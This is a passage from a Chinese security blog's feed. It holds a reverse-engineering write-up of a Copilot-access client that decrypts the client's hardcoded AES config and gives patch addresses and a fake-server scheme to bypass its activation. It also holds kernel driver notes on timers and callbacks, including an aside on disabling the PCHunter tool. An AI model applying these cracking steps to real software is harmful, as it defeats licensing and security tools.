src="https://img-1300594400.cos.ap-shanghai.myqcloud.com/uploads/big/5b6937a0583f0c2bb87eb8746fb6da86.png" alt="image-20240328150411467" /></p><p>和wireshark拦截到的报文一样，跟进AES解密看看</p><p><img src="https://img-1300594400.cos.ap-shanghai.myqcloud.com/uploads/big/4872a34c83530c548d73ad5f8a9e0edf.png" alt="image-20240328150500799" /></p><p>这里可以自己确认一下，确实是Base64解码的</p><p><img src="https://img-1300594400.cos.ap-shanghai.myqcloud.com/uploads/big/b8f63dc746e6142d8fbc094e1e044b6b.png" alt="image-20240328151834101" /></p><p>这里看一下<code>crypto_aes_NewCipher</code>，根据Windows下的传参规则，看一下栈和<code>rcx</code>，<code>rdx</code>，<code>r8</code>，<code>r9</code> <code>...</code></p><p><img src="https://img-1300594400.cos.ap-shanghai.myqcloud.com/uploads/big/558d4083ef42f374961f5fa815011d77.png" alt="image-20240328152054358" /></p><p>那么应该就是Key了</p><p><img src="https://img-1300594400.cos.ap-shanghai.myqcloud.com/uploads/big/251621fe0d79cd536c57e89bc691324d.png" alt="image-20240328150718900" /></p><p>这里要开始解密了对吧，还是看下相关参数</p><p>猜测：这时候的key和iv都是<code>1234567890123456</code>，写个python脚本验证下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.Padding <span class="keyword">import</span> unpad</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">aes_cbc_decrypt</span>(<span class="params">key, iv, ciphertext</span>):</span><br><span class="line">    cipher = AES.new(key, AES.MODE_CBC, iv)</span><br><span class="line">    plaintext = cipher.decrypt(ciphertext)</span><br><span class="line">    plaintext = unpad(plaintext, AES.block_size)</span><br><span class="line">    <span class="keyword">return</span> plaintext</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    <span class="comment"># 密钥和IV（Initialization Vector）</span></span><br><span class="line">    key = <span class="string">b&#x27;1234567890123456&#x27;</span></span><br><span class="line">    iv = <span class="string">b&#x27;1234567890123456&#x27;</span></span><br><span class="line">    ciphertext = base64.b64decode(<span class="string">b&#x27;k9FQxxxxxxxxxxxxxxxxxxx9wy7w==&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 解密</span></span><br><span class="line">    plaintext = aes_cbc_decrypt(key, iv, ciphertext)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 输出解密后的明文</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Decrypted plaintext:\n&quot;</span>, plaintext.decode(<span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure><p>得到了两个IP，根据后续操作会把解密出的字符串按照<code>,</code>切分开，而且第一个ip就是wireshark得到的，那么就是一个主用，一个备用两个IP</p><p><img src="https://img-1300594400.cos.ap-shanghai.myqcloud.com/uploads/big/4e8202a0421cba9627f44559f8b5dafe.png" alt="image-20240328152657681" /></p><p><img src="https://img-1300594400.cos.ap-shanghai.myqcloud.com/uploads/big/c816ca26646d4fab48a4a238a21f90a1.png" alt="image-20240328153020248" /></p><h2 id="143xxx"><a class="markdownIt-Anchor" href="#143xxx"></a> 143.x.x.x</h2><p><img src="https://img-1300594400.cos.ap-shanghai.myqcloud.com/uploads/big/55bfbd6dc95952f309209799fba04d59.png" alt="image-20240328153057080" /></p><p><img src="https://img-1300594400.cos.ap-shanghai.myqcloud.com/uploads/big/8d90360b6f7c444f12e76341c51f527e.png" alt="image-20240328153154421" /></p><p><img src="https://img-1300594400.cos.ap-shanghai.myqcloud.com/uploads/big/dba1bd1ec60b516e0489b1b211857c43.png" alt="image-20240328153647769" /></p><p>这里有个很明显的拼接api的操作，得到url：<code>http://149.x.x.x:8699/api/v</code>，和ipB的流量对上了</p><p><img src="https://img-1300594400.cos.ap-shanghai.myqcloud.com/uploads/big/fc9b121500715223314b7da22858a6b6.png" alt="image-20240328153718535" /></p><p>接着用了和上面一样的解密函数，解密一下看看</p><p><img src="https://img-1300594400.cos.ap-shanghai.myqcloud.com/uploads/big/f1c66826a18679b2e386f0c76db94441.png" alt="image-20240328153927993" /></p><p>发现了一个新的url，记为<code>urlB</code></p><p><img src="https://img-1300594400.cos.ap-shanghai.myqcloud.com/uploads/big/b56778815fb0c85ffc42c713cc2b49c9.png" alt="image-20240328154034283" /></p><p><img src="https://img-1300594400.cos.ap-shanghai.myqcloud.com/uploads/big/eb683ff98d23acc7f208875322dee860.png" alt="image-20240328154130156" /></p><p>解析这个json，然后就是一些文件操作，然后来到了输入激活码的地方</p><h2 id="激活"><a class="markdownIt-Anchor" href="#激活"></a> 激活</h2><p><img src="https://img-1300594400.cos.ap-shanghai.myqcloud.com/uploads/big/32f31a0ef77265eed3d30cc39c9f4f58.png" alt="image-20240328154349545" /></p><p><img src="https://img-1300594400.cos.ap-shanghai.myqcloud.com/uploads/big/acebaa815b8afac070f436ac1a2f30f6.png" alt="image-20240328154517796" /></p><p>第一处认证，说明输入的激活码长度要为16，这里后续可能要patch，记一下patch点：<code>00000000006A3CF1</code></p><p><img src="https://img-1300594400.cos.ap-shanghai.myqcloud.com/uploads/big/12a3d4f2556f9e8c20ffdae87bdaab07.png" alt="image-20240328154705589" /></p><p>这里还有后续都做了一些信息搜集，其中包括有：时间戳，主机名(hostname)，所有网卡的mac，本地IP，还有一个user（可能是正确的激活码才会有的）</p><p><img src="https://img-1300594400.cos.ap-shanghai.myqcloud.com/uploads/big/c0f05c45877b764bf05b002d8dbb26de.png" alt="image-20240328155108207" /></p><p>这里调用了一个<code>main_ec</code>，先看一下截至目前拼接的字符串</p><p><img src="https://img-1300594400.cos.ap-shanghai.myqcloud.com/uploads/big/1cd57ec5e4bb3f6c29515afbd9bcb1e9.png" alt="image-20240328155141755" /></p><p><img src="https://img-1300594400.cos.ap-shanghai.myqcloud.com/uploads/big/0de9c338c7f0b006867940181870ff75.png" alt="image-20240328155231715" /></p><p>不用认证分析了，功能：加密，key和iv两个都试一下，密文选择后面base64过后的内容</p><p><img src="https://img-1300594400.cos.ap-shanghai.myqcloud.com/uploads/big/ca5a94668dbac66be885ae03eecf75e2.png" alt="image-20240328160202691" /></p><p><img src="https://img-1300594400.cos.ap-shanghai.myqcloud.com/uploads/big/999097adb13ed0504686ca03d6dd061c.png" alt="image-20240328160242425" /></p><p>最后发现使用，key：<code>1234567890ABCDEF</code>，iv：<code>ABCDEF1234567890</code></p><p><img src="https://img-1300594400.cos.ap-shanghai.myqcloud.com/uploads/big/0729af5ea300c003fc8e94c3d0fba1cb.png" alt="image-20240328160352591" /></p><p><img src="https://img-1300594400.cos.ap-shanghai.myqcloud.com/uploads/big/005fbc331117868d3c9de5f3f78f72ae.png" alt="image-20240328160553109" /></p><p><img src="https://img-1300594400.cos.ap-shanghai.myqcloud.com/uploads/big/595b90a0eb802058cc030c48b42a0727.png" alt="image-20240328160643189" /></p><p>拼接好参数，用最开始通讯的密钥和iv进行加密，使用POST送回服务端，貌似我们距离最后的认证也来越近了</p><h2 id="校验"><a class="markdownIt-Anchor" href="#校验"></a> 校验</h2><p><img src="https://img-1300594400.cos.ap-shanghai.myqcloud.com/uploads/big/f2a23063aa38d9de6ae9abd3b4c91551.png" alt="image-20240328161126355" /></p><p><img src="https://img-1300594400.cos.ap-shanghai.myqcloud.com/uploads/big/c2dc2cea4390441735ea54de46c3b8f5.png" alt="image-20240328161105890" /></p><p>接收到返回后就开始各种比较，那么这里就是校验的地方了，直接nop或者jmp掉就可以了，注意jmp的话栈上面的修改别覆盖了，得到第二个patch的位置：<code>00000000006A4293</code></p><p>这里动态调试我就直接改rip过了</p><p><img src="https://img-1300594400.cos.ap-shanghai.myqcloud.com/uploads/big/776b072899c97c4555bd43f6fc3f1d9f.png" alt="image-20240328161249744" /></p><p><img src="https://img-1300594400.cos.ap-shanghai.myqcloud.com/uploads/big/267212cc688c5fa796fe0fb187050b82.png" alt="image-20240328161327045" /></p><h2 id="破解coploit"><a class="markdownIt-Anchor" href="#破解coploit"></a> 破解coploit</h2><p>哈哈，你不会真的以为有什么方法能免费试用coploit吧</p><p>无害之处就在于此</p><p>就和chatGPT一样，这个用的时候要联网，联网会验证token，所以这样的token肯定没有在他数据库里面注册过</p><p>这些平台只是做一个流量转发，买几个<code>key</code>然后做个token转换然后卖给大家用而已，是不是割韭菜就仁者见仁智者见智了</p><p><img src="https://img-1300594400.cos.ap-shanghai.myqcloud.com/uploads/big/22c3130c52d0e00b096e9c321edab646.png" alt="image-20240328161936587" /></p><p>根据我所了解的大多是修改js文件等等的操作进行的，后续具体修改插件什么的操作，js相关文件怎么实现的，就不再分析了，点到为止</p><h1 id="打包"><a class="markdownIt-Anchor" href="#打包"></a> 打包</h1><p>截图的地址可能有问题是因为我重新用IDA打开过一次</p><h2 id="0x6a3cf1"><a class="markdownIt-Anchor" href="#0x6a3cf1"></a> 0x6A3CF1</h2><p><img src="https://img-1300594400.cos.ap-shanghai.myqcloud.com/uploads/big/049b9079c31f292231c347531bbd9aab.png" alt="image-20240328162119065" /></p><p>nop掉，但是这个内容会返回到服务端，如果服务端默认这个是16个字符串而且使用了下标寻找内容，可能会出问题</p><p><img src="https://img-1300594400.cos.ap-shanghai.myqcloud.com/uploads/big/43da0b7f6494ae69af300c66d51e068d.png" alt="image-20240328162228494" /></p><h2 id="0x6a4293"><a class="markdownIt-Anchor" href="#0x6a4293"></a> 0x6A4293</h2><p>需要注意的是</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">.text:00000000006A42B5                 mov     rax, [rsp+0A58h+var_5F0]</span><br><span class="line">.text:00000000006A42BD                 mov     rbx, [rsp+0A58h+var_968]</span><br><span class="line">.text:00000000006A42C5                 mov     rcx, [rsp+0A58h+var_560]</span><br><span class="line">.text:00000000006A42CD                 mov     rdi, [rsp+0A58h+var_8C8]</span><br><span class="line">.text:00000000006A42D5                 mov     rsi, [rsp+0A58h+var_680]</span><br><span class="line">.text:00000000006A42DD                 mov     r8, [rsp+0A58h+var_9C8]</span><br><span class="line">.text:00000000006A42E5                 call    main_writeHostsJSON2</span><br></pre></td></tr></table></figure><p>这段修改了寄存器的值，如果跳过可能对<code>main_writeHostsJSON2</code>有不好的影响，把校验全部nop</p><p><img src="https://img-1300594400.cos.ap-shanghai.myqcloud.com/uploads/big/140e555b7072a7895ccbdb0e9a0b3476.png" alt="image-20240328165823229" /></p><hr /><p>初步达到效果</p><p><img src="https://img-1300594400.cos.ap-shanghai.myqcloud.com/uploads/big/1b49ee80f0fd38cca8e43806ae1aede7.png" alt="image-20240328170337749" /></p><h2 id="网络连接"><a class="markdownIt-Anchor" href="#网络连接"></a> 网络连接</h2><h3 id="思路a"><a class="markdownIt-Anchor" href="#思路a"></a> 思路A</h3><p>根据相关传参，按照一下两次<code>jmp</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">.text: 00000000006631B9                 call    net_http___Client__Get</span><br><span class="line">.text: 00000000006638D8                 call    os_UserHomeDir</span><br><span class="line">----------------------------------------------------------------------------</span><br><span class="line">.text: 00000000006641B4                 call    net_http___Client__Post</span><br><span class="line">.text: 00000000006642B5                 mov     rax, [rsp+0A58h+var_5F0]</span><br></pre></td></tr></table></figure><h3 id="思路b"><a class="markdownIt-Anchor" href="#思路b"></a> 思路B</h3><p>修改域名和ip为自己的，自己搭一套服务</p><ol><li><p>urlA的网络模拟</p><p><code>urls</code> =<code> authURL_A</code>+“,”+<code>authURL_B</code></p><p>使用Key-iv = <code>1234567890123456</code>-<code>1234567890123456</code>进行AES-CBC加密<code>urls </code>并返回</p></li><li><p>urlB的网络模拟</p><p>返回如下json值</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span><span class="attr">&quot;link&quot;</span><span class="punctuation">:</span><span class="string">&quot;https://xxxxx.xyz/xxxx.html&quot;</span><span class="punctuation">,</span><span class="attr">&quot;type&quot;</span><span class="punctuation">:</span><span class="string">&quot;x&quot;</span><span class="punctuation">,</span><span class="attr">&quot;title&quot;</span><span class="punctuation">:</span><span class="string">&quot;x.x&quot;</span><span class="punctuation">,</span><span class="attr">&quot;id&quot;</span><span class="punctuation">:</span>x<span class="punctuation">,</span><span class="attr">&quot;linktext&quot;</span><span class="punctuation">:</span><span class="string">&quot;xxxxxxxxx&quot;</span><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure></li><li><p>接收post传参，返回值随便（客户端得patch）</p></li></ol><hr /><p>最终效果</p><p><img src="https://img-1300594400.cos.ap-shanghai.myqcloud.com/uploads/big/91efd3518aff1ad455201e80e1a155dc.png" alt="image-20240328174729083" /></p>]]></content>
    
    
    <summary type="html">&lt;p&gt;难度：⭐&lt;/p&gt;
&lt;p&gt;- 要不要后面把怎么写外挂啥的放上来？还是说开一个知识星球？-&lt;/p&gt;</summary>
    
    
    
    <category term="program" scheme="https://joe1sn.eu.org/categories/program/"/>
    
    
    <category term="malware" scheme="https://joe1sn.eu.org/tags/malware/"/>
    
    <category term="crack" scheme="https://joe1sn.eu.org/tags/crack/"/>
    
  </entry>
  
  <entry>
    <title>windows内核驱动 8-计时器与通知</title>
    <link href="https://joe1sn.eu.org/2024/03/27/windows-kernel-driver-8-timer-notify/"/>
    <id>https://joe1sn.eu.org/2024/03/27/windows-kernel-driver-8-timer-notify/</id>
    <published>2024-03-27T08:00:21.000Z</published>
    <updated>2025-01-26T14:46:00.752Z</updated>
    
    <content type="html"><![CDATA[<p>在内核中使用定时器、通知和回调</p><p>…学到一半打靶场去了</p><h1 id="定时器"><a class="markdownIt-Anchor" href="#定时器"></a> 定时器</h1><p>CPU最短能统计时间为100纳秒 100ns</p><p>内核中使用LARGEINT来表示时间长度</p><p>1s = -10 *1000 * 1000</p><h2 id="基于设备的io定时器"><a class="markdownIt-Anchor" href="#基于设备的io定时器"></a> 基于设备的IO定时器</h2><p>在<code>DriverEntry</code>里面尝试一下</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">VOID <span class="title">TimeWorker</span><span class="params">(PVOID CONTEXT)</span> </span>&#123;</span><br><span class="line">    <span class="built_in">DbgPrint</span>(<span class="string">&quot;Irql: %d\n&quot;</span>, <span class="built_in">KeGetCurrentIrql</span>());</span><br><span class="line">    <span class="built_in">DbgPrint</span>(<span class="string">&quot;Process: %s\n&quot;</span>, <span class="built_in">PsGetProcessImageFileName</span>(<span class="built_in">PsGetCurrentProcess</span>()));</span><br><span class="line">&#125;</span><br><span class="line"><span class="function">NTSTATUS</span></span><br><span class="line"><span class="function"><span class="title">DriverEntry</span><span class="params">(PDRIVER_OBJECT  DriverObject, PUNICODE_STRING RegistryPath)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="comment">//    ...</span></span><br><span class="line">    <span class="built_in">IoInitializeTimer</span>(pDevice, TimeWorker, <span class="literal">NULL</span>);</span><br><span class="line">    <span class="built_in">IoStartTimer</span>(pDevice);</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">Unload</span>()&#123;</span><br><span class="line">    <span class="built_in">IoStopTimer</span>(DriverObject-&gt;DeviceObject);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://img-1300594400.cos.ap-shanghai.myqcloud.com/uploads/big/d8a887058e533a26fd3119640ff28557.png" alt="image-20240327161718432" /></p><p>主要API</p><ul><li><p><code>IoInitializeTimer</code>：创建定时</p></li><li><p><code>IoStartTimer</code>：开启定时</p></li><li><p><code>IoStopTimer</code>：关闭定时</p></li></ul><p>技巧</p><ul><li>同时启用两个定时器可以关闭PCHUNTER</li><li>做认证</li></ul><h2 id="结合dpc的定时器"><a class="markdownIt-Anchor" href="#结合dpc的定时器"></a> 结合DPC的定时器</h2><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//全局变量</span></span><br><span class="line">KDPC kDPC = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">LARGE_INTEGER DpcTime = &#123; <span class="number">0</span> &#125;;</span><br><span class="line"></span><br><span class="line"><span class="built_in">KeInitializeTimer</span>(&amp;keTimer);</span><br><span class="line">    KDPC kDPC = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">    <span class="built_in">KeInitializeDpc</span>(&amp;kDPC, &amp;DpcRoutineFunc, <span class="literal">NULL</span>);</span><br><span class="line">    LARGE_INTEGER DpcTime = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">    DpcTime.QuadPart = <span class="number">-10</span> * <span class="number">1000</span> * <span class="number">2000</span>;</span><br><span class="line">    <span class="built_in">KeSetTimer</span>(&amp;keTimer, DpcTime, &amp;kDPC);</span><br><span class="line"></span><br><span class="line"><span class="built_in">KeCancelTimer</span>(&amp;keTimer);</span><br></pre></td></tr></table></figure><p><img src="https://img-1300594400.cos.ap-shanghai.myqcloud.com/uploads/big/f9b8a75ab6eab4e335c7f7f88140713f.png" alt="image-20240327164409369" /></p><ul><li>后续可以通过<code>KeWait</code>来判断超时之类的</li><li>这个只会触发一次</li></ul><p><strong>放在工作队列线程池中运行</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">ExInitializeWorkItem</span>(&amp;work_item, WorkItemRoutine, <span class="literal">NULL</span>);</span><br><span class="line"><span class="built_in">ExQueueWorkItem</span>(&amp;work_item, CriticalWorkQueue);</span><br></pre></td></tr></table></figure><p><img src="https://img-1300594400.cos.ap-shanghai.myqcloud.com/uploads/big/8252549ad4ddd4cf75ab29a1ca6c01cb.png" alt="image-20240327170200351" /></p><ul><li>例程级别很低</li><li><code>WorkItemRoutine</code>别陷入死循环，<strong>同步</strong></li></ul><h1 id="通知"><a class="markdownIt-Anchor" href="#通知"></a> 通知</h1><p>通知：发生某一件事变更，知道事情变更，但不能操作变更的结果。<code>PsCreateNotify</code></p><p>回调：能拦截相关信息，更改流程和结果。</p><p><a href="https://joe1sn.eu.org/2024/03/20/windows-kernel-driver-6-memory/">windows内核驱动 6-链表与进程</a>讲了部分</p><p>模块加载回调：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">VOID <span class="title">ImageRoutine</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">    PUNICODE_STRING FullImageName,</span></span></span><br><span class="line"><span class="params"><span class="function">    HANDLE ProcessId,                <span class="comment">// pid into which image is being mapped</span></span></span></span><br><span class="line"><span class="params"><span class="function">    PIMAGE_INFO ImageInfo</span></span></span><br><span class="line"><span class="params"><span class="function">)</span> </span>&#123;</span><br><span class="line">    <span class="comment">//DbgPrint(&quot;Triigered callback\n&quot;);</span></span><br><span class="line">    PEPROCESS temppe = <span class="literal">NULL</span>;</span><br><span class="line">    NTSTATUS status = STATUS_SUCCESS;</span><br><span class="line">    status = <span class="built_in">PsLookupProcessByProcessId</span>(ProcessId, &amp;temppe);</span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">NT_SUCCESS</span>(status)) &#123;</span><br><span class="line">        <span class="built_in">ObDereferenceObject</span>(temppe);</span><br><span class="line">        PUCHAR imagename = <span class="built_in">PsGetProcessImageFileName</span>(temppe);</span><br><span class="line">        <span class="built_in">DbgPrint</span>(<span class="string">&quot;[%s] load [%wZ] with baseaddr [%llx]\n&quot;</span>, imagename, FullImageName, ImageInfo-&gt;ImageBase);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//DbgPrint(&quot;FullImageName: %wZ---PID: %d\n&quot;, FullImageName, ProcessId);</span></span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="built_in">PsSetLoadImageNotifyRoutine</span>(ImageRoutine);</span><br><span class="line"><span class="built_in">PsRemoveLoadImageNotifyRoutine</span>(ImageRoutine);</span><br></pre></td></tr></table></figure><p><img src="https://img-1300594400.cos.ap-shanghai.myqcloud.com/uploads/big/c39428184cbd25839e0f744924c3ea0e.png" alt="image-20240327175140251" /></p><p>其他的也很类似</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;在内核中使用定时器、通知和回调&lt;/p&gt;
&lt;p&gt;…学到一半打靶场去了&lt;/p&gt;
&lt;h1 id=&quot;定时器&quot;&gt;&lt;a class=&quot;markdownIt-Anchor&quot; href=&quot;#定时器&quot;&gt;&lt;/a&gt; 定时器&lt;/h1&gt;
&lt;p&gt;CPU最短能统计时间为100纳秒 100ns&lt;/p&gt;
&lt;</summary>
      
    
    
    
    <category term="notes" scheme="https://joe1sn.eu.org/categories/notes/"/>
    
    <category term="kernel" scheme="https://joe1sn.eu.org/categories/notes/kernel/"/>
    
    
    <category term="kernel" scheme="https://joe1sn.eu.org/tags/kernel/"/>
    
    <category term="windows" scheme="https://joe1sn.eu.org/tags/windows/"/>
    
  </entry>
  
</feed>
